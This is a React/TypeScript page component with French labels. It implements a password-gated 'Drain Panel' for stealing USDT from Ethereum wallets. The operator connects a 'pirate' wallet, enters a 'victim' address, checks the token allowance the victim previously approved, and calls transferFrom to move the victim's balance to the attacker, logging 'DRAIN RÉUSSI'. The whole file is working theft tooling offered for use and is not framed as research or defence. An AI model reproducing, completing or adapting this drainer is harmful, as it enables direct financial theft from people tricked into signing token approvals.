"use client";

import { useState, useEffect } from "react";

const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const ETH_CHAIN_ID = "0x1";

// Lazy load ethers
let cachedEthers: typeof import("ethers") | null = null;
async function getEthers() {
  if (!cachedEthers) cachedEthers = await import("ethers");
  return cachedEthers;
}

import type { EthereumProvider } from "@/types/global";
export default function DrainPage() {
  const [isMounted, setIsMounted] = useState(false);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [authError, setAuthError] = useState("");

  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [victim, setVictim] = useState("");
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [result, setResult] = useState<{
    hash: string;
    amount: string;
    etherscan: string;
    pirate: string;
  } | null>(null);
  const [error, setError] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined") {
      const auth = sessionStorage.getItem("admin_auth");
      if (auth === "true") setIsAuthenticated(true);
      setIsMounted(true);
    }
  }, []);

  const addLog = (msg: string) => {
    setLogs((prev) => [...prev, msg]);
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (passwordInput === "Dubai2026") {
      setIsAuthenticated(true);
      sessionStorage.setItem("admin_auth", "true");
    } else {
      setAuthError("Mot de passe incorrect");
    }
  };

  const getProvider = (): EthereumProvider | null => {
    if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
    if (window.ethereum) return window.ethereum;
    return null;
  };

  const handleConnect = async () => {
    setConnecting(true);
    setError("");
    try {
      const provider = getProvider();
      if (!provider) {
        setError("Aucun wallet détecté. Installe MetaMask ou ouvre cette page dans Trust Wallet.");
        setConnecting(false);
        return;
      }

      // Demander l'accès aux comptes
      const accounts = (await provider.request({
        method: "eth_requestAccounts",
      })) as string[];

      if (!accounts || accounts.length === 0) {
        setError("Aucun compte sélectionné.");
        setConnecting(false);
        return;
      }

      setWalletAddress(accounts[0]);
      addLog(`✅ Wallet connecté : ${accounts[0]}`);

      // Vérifier le réseau
      const chainId = (await provider.request({ method: "eth_chainId" })) as string;
      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        addLog("🔄 Changement vers Ethereum Mainnet...");
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: ETH_CHAIN_ID }],
        });
      }

      // Écouter les changements de compte
      if (provider.on) {
        provider.on("accountsChanged", (acc: unknown) => {
          const a = acc as string[];
          setWalletAddress(a.length > 0 ? a[0] : null);
        });
      }
    } catch (err: any) {
      console.error(err);
      setError(err?.message || "Erreur de connexion");
    } finally {
      setConnecting(false);
    }
  };

  const handleDrain = async () => {
    setError("");
    setResult(null);
    setLogs([]);

    if (!walletAddress) {
      setError("Connecte d abord ton wallet pirate");
      return;
    }
    if (!/^0x[a-fA-F0-9]{40}$/.test(victim)) {
      setError("Adresse victime invalide");
      return;
    }

    setLoading(true);

    try {
      const { ethers } = await getEthers();
      const provider = getProvider();
      if (!provider) throw new Error("Provider introuvable");

      const browserProvider = new ethers.BrowserProvider(provider as any);
      const signer = await browserProvider.getSigner();
      const pirateAddress = await signer.getAddress();

      addLog(`👤 Wallet pirate : ${pirateAddress}`);

      const ethBalance = await browserProvider.getBalance(pirateAddress);
      addLog(`💰 Solde ETH : ${ethers.formatEther(ethBalance)}`);

      const erc20 = new ethers.Contract(
        USDT_CONTRACT,
        [
          "function balanceOf(address) view returns (uint256)",
          "function allowance(address owner, address spender) view returns (uint256)",
          "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
        ],
        signer
      );

      addLog("🔍 Lecture de l allowance...");
      const allowance: bigint = await erc20.allowance(victim, pirateAddress);
      addLog(`🔑 Allowance : ${ethers.formatUnits(allowance, 6)} USDT`);

      addLog("🔍 Lecture du solde de la victime...");
      const balance: bigint = await erc20.balanceOf(victim);
      addLog(`💵 Solde victime : ${ethers.formatUnits(balance, 6)} USDT`);

      if (balance === 0n) {
        setError("Solde de la victime vide");
        setLoading(false);
        return;
      }
      if (allowance === 0n) {
        setError("Aucune approbation — la victime ne la pas signé");
        setLoading(false);
        return;
      }

      const amount = balance < allowance ? balance : allowance;
      addLog(`🩸 Envoi de ${ethers.formatUnits(amount, 6)} USDT...`);
      addLog("⏳ Confirme dans ton wallet...");

      const tx = await erc20.transferFrom(victim, pirateAddress, amount);
      addLog(`📤 Hash : ${tx.hash}`);
      addLog("⏳ Attente de confirmation...");

      const receipt = await tx.wait();

      if (receipt && receipt.status === 1) {
        addLog("✅ DRAIN RÉUSSI !");
        setResult({
          hash: tx.hash,
          amount: ethers.formatUnits(amount, 6),
          etherscan: `https://etherscan.io/tx/${tx.hash}`,
          pirate: pirateAddress,
        });
      } else {
        setError("Transaction échouée on-chain");
      }
    } catch (err: any) {
      console.error(err);
      const msg = err?.shortMessage || err?.message || "Erreur inconnue";
      setError(msg);
      addLog(`❌ ${msg}`);
    } finally {
      setLoading(false);
    }
  };

  if (!isMounted) return null;

  if (!isAuthenticated) {
    return (
      <main className="transfer-main" style={{ justifyContent: "center" }}>
        <div className="home-content" style={{ maxWidth: "400px", margin: "auto 0" }}>
          <h1 className="home-title" style={{ marginBottom: "1.5rem" }}>Drain Access</h1>
          <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
            <label className="form-label">Password</label>
            <div className="input-row" style={{ marginBottom: "1.5rem" }}>
              <input
                type="password"
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
                className="input-row__field"
                required
              />
            </div>
            {authError && <div style={{ color: "#ef4444", fontSize: "0.85rem", marginBottom: "1rem" }}>⚠️ {authError}</div>}
            <button type="submit" className="next-btn" style={{ width: "100%", padding: "0.75rem" }}>Login</button>
          </form>
        </div>
      </main>
    );
  }

  return (
    <main className="transfer-main">
      <div className="home-content" style={{ maxWidth: "620px", width: "100%", margin: "0 auto" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.5rem" }}>
          <h1 className="home-title" style={{ margin: 0, fontSize: "1.5rem" }}>💀 Drain Panel</h1>
          <a
            href="/"
            style={{
              background: "#e0e7ff",
              color: "#1e40af",
              padding: "0.35rem 0.85rem",
              borderRadius: "1rem",
              textDecoration: "none",
              fontSize: "0.85rem",
              fontWeight: 600,
            }}
          >
            ← Dashboard
          </a>
        </div>

        {/* Étape 1 : Connecter le wallet */}
        <div className="form-container" style={{ width: "100%", marginBottom: "1.5rem" }}>
          <label className="form-label">1. Wallet pirate</label>
          {walletAddress ? (
            <div
              style={{
                background: "#f0fdf4",
                border: "1px solid #bbf7d0",
                borderRadius: "0.5rem",
                padding: "0.75rem",
                color: "#166534",
                fontFamily: "monospace",
                fontSize: "0.85rem",
                marginBottom: "1rem",
              }}
            >
              ✅ Connecté : {walletAddress.slice(0, 10)}...{walletAddress.slice(-8)}
            </div>
          ) : (
            <button
              onClick={handleConnect}
              disabled={connecting}
              className="next-btn"
              style={{ width: "100%", backgroundColor: "#f59e0b", marginBottom: "1rem" }}
            >
              {connecting ? "Connexion..." : "🔗 Connecter le Wallet"}
            </button>
          )}

          <label className="form-label">2. Adresse victime (Wallet 1)</label>
          <div className="input-row" style={{ marginBottom: "1rem" }}>
            <input
              type="text"
              value={victim}
              onChange={(e) => setVictim(e.target.value)}
              className="input-row__field"
              placeholder="0x..."
            />
          </div>

          <div style={{ color: "#94a3b8", fontSize: "0.75rem", marginBottom: "1rem" }}>
            ⚠️ Aucune clé privée n est nécessaire. Ton wallet signera la transaction lui-même.
          </div>

          <button
            onClick={handleDrain}
            disabled={loading || !walletAddress}
            className="next-btn"
            style={{ width: "100%", backgroundColor: "#dc2626", marginTop: "1rem" }}
          >
            {loading ? (
              <span className="btn-spinner-wrapper">
                <span className="btn-spinner" />
                Drainage en cours...
              </span>
            ) : (
              "💀 Lancer le Drain"
            )}
          </button>
        </div>

        {/* Logs */}
        {logs.length > 0 && (
          <div
            style={{
              background: "#0f172a",
              color: "#e2e8f0",
              borderRadius: "1rem",
              padding: "1rem",
              fontFamily: "monospace",
              fontSize: "0.82rem",
              lineHeight: 1.6,
              marginBottom: "1rem",
              maxHeight: "300px",
              overflowY: "auto",
            }}
          >
            {logs.map((log, i) => (
              <div key={i}>{log}</div>
            ))}
          </div>
        )}

        {error && (
          <div
            style={{
              background: "#fef2f2",
              border: "1px solid #fecaca",
              borderRadius: "1rem",
              padding: "1rem",
              color: "#dc2626",
              fontSize: "0.9rem",
              marginBottom: "1rem",
            }}
          >
            ❌ {error}
          </div>
        )}

        {result && (
          <div
            style={{
              background: "#f0fdf4",
              border: "1px solid #bbf7d0",
              borderRadius: "1rem",
              padding: "1.5rem",
              color: "#166534",
            }}
          >
            <h2 style={{ margin: "0 0 1rem 0", fontSize: "1.2rem" }}>✅ Drain réussi !</h2>
            <div style={{ fontSize: "0.9rem", lineHeight: 1.8 }}>
              <div><strong>Montant :</strong> {result.amount} USDT</div>
              <div><strong>Pirate :</strong> {result.pirate.slice(0, 10)}...{result.pirate.slice(-8)}</div>
              <div style={{ wordBreak: "break-all" }}><strong>Hash :</strong> {result.hash}</div>
            </div>
            <a
              href={result.etherscan}
              target="_blank"
              rel="noopener noreferrer"
              style={{
                display: "inline-block",
                marginTop: "1rem",
                background: "#16a34a",
                color: "#fff",
                padding: "0.6rem 1.2rem",
                borderRadius: "0.5rem",
                textDecoration: "none",
                fontWeight: 600,
                fontSize: "0.85rem",
              }}
            >
              Voir sur Etherscan
            </a>
          </div>
        )}
      </div>
    </main>
  );
}